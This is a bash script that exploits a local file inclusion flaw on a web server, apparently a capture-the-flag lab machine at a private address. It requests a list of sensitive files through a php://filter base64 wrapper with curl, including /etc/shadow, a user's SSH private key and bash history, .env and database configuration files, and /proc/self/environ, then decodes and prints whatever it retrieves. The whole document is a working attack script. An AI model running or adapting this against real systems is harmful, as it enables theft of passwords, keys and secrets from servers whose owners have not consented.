#!/bin/bash

TARGET="http://10.10.207.200/secret-script.php?file="  # <-- Change to match your actual LFI URL

# List of sensitive files to check
paths=(
"/etc/passwd"
"/etc/shadow"
"/etc/hostname"
"/etc/hosts"
"/etc/crontab"
"/proc/self/environ"
"/var/log/auth.log"
"/var/log/apache2/access.log"
"/var/log/apache2/error.log"
"/home/comte/.bash_history"
"/home/comte/.ssh/id_rsa"
"/home/comte/.ssh/authorized_keys"
"/home/comte/.profile"
"/home/comte/.bashrc"
"/home/comte/user.txt"
"/var/www/html/index.php"
"/var/www/html/secret-script.php"
"/var/www/html/config.php"
"/var/www/html/.env"
"/var/www/html/db.php"
"/var/www/html/connection.php"
"/var/www/html/backup.php"
)

echo "[*] Starting LFI scan on $TARGET"
echo

for path in "${paths[@]}"; do
    encoded_path="php://filter/convert.base64-encode/resource=$path"
    url="${TARGET}${encoded_path}"

    response=$(curl -s --max-time 10 "$url")
    if [[ -n "$response" ]]; then
        # Try to decode it (base64). Output will be junk if not valid.
        decoded=$(echo "$response" | base64 -d 2>/dev/null)

        if [[ -n "$decoded" ]]; then
            echo -e "\n[+] Found readable file: $path"
            echo "--------------------------------------"
            echo "$decoded"
        else
            echo "[ ] File not readable or decoding failed: $path"
        fi
    else
        echo "[ ] Empty response or inaccessible: $path"
    fi
done
